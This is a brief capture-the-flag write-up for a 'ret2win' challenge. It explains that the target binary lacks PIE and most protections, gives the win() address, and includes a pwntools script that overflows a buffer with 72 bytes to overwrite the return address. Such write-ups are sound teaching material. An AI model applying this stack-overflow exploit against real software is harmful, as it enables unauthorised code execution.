# Description:

Ret2win_easy

# Solution

According to file `vuln.c` and the name of the challenge. We know it as [ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)

![image](https://github.com/N1GHT-F4LL/CTF/assets/60804710/d463e963-4dc9-4e54-a00e-1485af6436b0)

Use checksec to check various security features of executable files as bellow.

![image](https://github.com/N1GHT-F4LL/CTF/assets/60804710/d2e21fb8-5d4f-4e7f-aac6-32ca4435dbcd)

With security features mostly turned off making this exploit easier.

With no PIE, address of win() address is always `0x00401156`.

The final step is to insert the required amount of bytes and rewrite the RIP register.

``` python
from pwn import *

e = ELF('./vuln')
p=process(e.path)
gdb.attach(p, '''
b* win + 30
''')
winAddr = p64(e.sym['win']+8)
ofset = 72
payload = b'A'*ofset+winAddr
p.sendline(payload)
p.interactive()
```
